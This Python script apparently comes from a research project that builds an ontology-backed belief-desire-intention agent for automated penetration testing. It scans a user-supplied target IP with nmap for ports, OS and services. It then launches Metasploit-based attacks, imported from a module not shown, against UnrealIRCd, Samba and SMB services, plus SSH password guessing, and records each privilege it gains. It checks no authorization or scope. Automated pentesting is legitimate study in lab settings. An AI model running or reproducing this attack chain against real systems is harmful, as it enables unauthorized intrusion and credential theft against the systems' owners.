import bdiagent.bdiagent as agent
import nmap
from pymetasploit3.msfrpc import MsfRpcClient
from owlready2 import *
from urllib.request import urlopen
import re as r
import MetasploitAttack
import socket
import Ontology
import gvm
from gvm.protocols.latest import Gmp
from gvm.connections import UnixSocketConnection
from gvm.protocols.gmp import Gmp
from gvm.transforms import EtreeTransform
from gvm.xml import pretty_print


# agent = agent.Agent()
# agent.beliefbase = {'os_type', 'port', 'service', 'vulnerability', 'password_ssh'}
# agent.believe_support('port', '20')
# agent.believe_support('port', '80')
# def get_initial_belief(beliefbase):
#     beliefbase['port'] = {'20', '80'}

class Main(agent.Agent):
    def __init__(self):
        agent.Agent.__init__(self)

    def load_ontology(self):
        return get_ontology("file:///home/fatemeh/ontology/project.rdf").load()

    def get_basic_information(self):
        self.start_on_file()
        self.beliefbase['privilege'] = ['none']
        print(f"current privilege is: {self.beliefbase['privilege']}")
        # assign the target IP to be scanned
        target_ip = input("please enter target ip address:\n")
        self.beliefbase['target_ip_address'] = target_ip
        hostname = socket.gethostname()
        self.beliefbase['host_ip_address'] = socket.gethostbyname(hostname)
        print("host ip address",self.beliefbase['host_ip_address'])
        self.beliefbase['host_ip_address'] = input("please enter host ip address:\n")
        file_string = "Target IP Address is :" + self.beliefbase['target_ip_address'] + "\n"
        file_string = file_string + "Host IP Address is :" + self.beliefbase['host_ip_address'] + "\n"
        print("start to information gathering stage...")
        onto = self.load_ontology()
        target1 = onto.target.instances()[0]
        # print(target1.IP_address)
        target1.IP_address.append(target_ip)
        # print(target1.IP_address)
        # onto.save()
        print("Probe the target os...")
        print("Probe the target port...")
        print("Probe the target service ...")
        self.beliefbase['port'] = self.probe_port(target_ip)

        self.beliefbase['ostype'] = self.probe_os(target_ip)
        # target1.OS.append(self.beliefbase['ostype'])

        # target1.port.extend(self.beliefbase['port'])

        self.beliefbase['service'], self.beliefbase['service_product'], self.beliefbase['service_cpe'] = self.probe_service(target_ip)
        # for port in self.beliefbase['port']:
        #     self.probe_vul(target_ip, port)
        return self



    def probe_port(self, target_ip):
        file_string = "open ports are: \n"
        scanner = nmap.PortScanner()
        ports = []
        # Scan a host for service and version detection
        scanner.scan(target_ip, arguments='-sV')

        # Print the detected services
        for host in scanner.all_hosts():
            for proto in scanner[host].all_protocols():
                print('----------------------------------------------------')
                lport = scanner[host][proto].keys()
                for port in lport:
                    ports.append(port)
                    print("port", port)
                    file_string = file_string + str(port) + "\n"
        self.write_on_file(file_string)
        return ports


    def probe_os(self, target_ip):
        file_string = "os type: "
        scanner = nmap.PortScanner()
        # Scan a host for OS detection
        scanner.scan(target_ip, arguments='-O')
        for host in scanner.all_hosts():
            if 'osmatch' in scanner[host]:
                for osmatch in scanner[host]['osmatch']:
                    if 'osclass' in osmatch:
                        for osclass in osmatch['osclass']:
                            print(f'Ip Address : {host}')
                            print(f"the target system is {osclass['osfamily']}")
                            print('OsClass.type : {0}'.format(osclass))
                            print('-------------------------------------------')
                            file_string = file_string + osclass['osfamily'] + "\n"
                            self.write_on_file(file_string)
                            return osclass['osfamily']

    """
    this method will get target_id as input and return services of host system that have open ports
    """

    def probe_service(self, target_ip):
        file_string = "active services are: "
        # Create a new PortScanner object
        scanner = nmap.PortScanner()
        required_ports = [22, 3306, 6667]
        services = []
        products = []
        cpes = []
        # Scan a host for service and version detection
        scanner.scan(target_ip, arguments='-sV')

        # Print the detected services
        for host in scanner.all_hosts():
            for proto in scanner[host].all_protocols():
                print('----------------------------------------------------')
                print('Host : %s' % host)
                print('Protocol : %s' % proto)

                lport = scanner[host][proto].keys()
                for port in lport:
                    print(f'the target port is :{port}')
                    print('the target service is {0}'.format(scanner[host][proto][port]['name']))
                    print('Service : %s' % scanner[host][proto][port])
                    file_string = file_string + "\nservice: " + scanner[host][proto][port]['name'] + "\t"
                    services.append(scanner[host][proto][port]['name'])
                    if (scanner[host][proto][port]['cpe'] != ''):
                        print(scanner[host][proto][port]['cpe'].split(':')[2])
                        cpes.append(scanner[host][proto][port]['cpe'].split(':')[2])
                        file_string = file_string + "cpe: " + scanner[host][proto][port]['cpe'].split(':')[2]
                    products.append(scanner[host][proto][port]['product'])
        self.write_on_file(file_string)
        return services, products, cpes

    # def probe_vul(self, target_ip, port):
    #     nmScan = nmap.PortScanner()
    #     vul = []
    #     # Scan for specific ports and services
    #     # nmScan.scan(target_ip, '22-443', arguments='-sV --script vulners')
    #     nmScan.scan(target_ip, str(port), arguments='-sV --script vulners')
    #     # nmScan.scan(target_id, '22-443')
    #     vulnerability_list = nmScan[target_ip]['tcp'].items()
    #     print("vulnerability: ")
    #     for item in vulnerability_list:
    #         print(item , end='\n')

    def attack(self):
        file_string = ''
        if 'unrealircd' in self.beliefbase['service_cpe']:
            print("starting buffer overflow attack on IRC service...")
            result = MetasploitAttack.irc_attack(self.beliefbase['target_ip_address'], self.beliefbase['host_ip_address'])
            if result == 'root':
                print("buffer overflow attack on IRC service is success ")
                self.beliefbase['privilege'].append('root')
                print('the current privilege is : {0}'.format(self.beliefbase['privilege']))
        if 'samba' in self.beliefbase['service_cpe'] or 445 in self.beliefbase['port'] and self.beliefbase['ostype'] == 'Linux':
            result = MetasploitAttack.samba_attack(self.beliefbase['target_ip_address'],
                                                 self.beliefbase['host_ip_address'])
            if result == 'root':
                print("buffer overflow attack on samba service is success ")
                self.beliefbase['privilege'].append(result)
                print('the current privilege is : {0}'.format(self.beliefbase['privilege']))

        if 'ssh' in self.beliefbase['service']:
            print("starting ssh password attack without using specific Module...")
            result, ssh_password, username = MetasploitAttack.ssh_password_attack(self.beliefbase['target_ip_address'], self.beliefbase['host_ip_address'])
            if result != 'root' or result != '':
                print("starting ssh password attack on using login_ssh Module...")
                result, ssh_password, username = MetasploitAttack.ssh_password_attack_with_ssh_login(self.beliefbase['target_ip_address'], self.beliefbase['host_ip_address'])
            if result != '' and ssh_password != '' and username != '':
                self.beliefbase['privilege'].append(result)
                self.beliefbase['ssh_password'] = ssh_password
                self.beliefbase['ssh_username'] = username

        if 445 in self.beliefbase['port'] and self.beliefbase['ostype'] == 'Windows':
            result = MetasploitAttack.smb_attack(self.beliefbase['target_ip_address'],
                                                   self.beliefbase['host_ip_address'])
            if result == 'root':
                print("buffer overflow attack on samba service is success ")
                self.beliefbase['privilege'].append(result)
                print('the current privilege is : {0}'.format(self.beliefbase['privilege']))

    def write_on_file(self, line):
        with open("/home/fatemeh/report.txt", "a+") as f:
            f.writelines(line)

    def start_on_file(self):
        with open("/home/fatemeh/report.txt", "w+") as f:
            f.writelines("result of penetration test .... \n")


agent = Main()
agent.get_basic_information()
agent.attack()
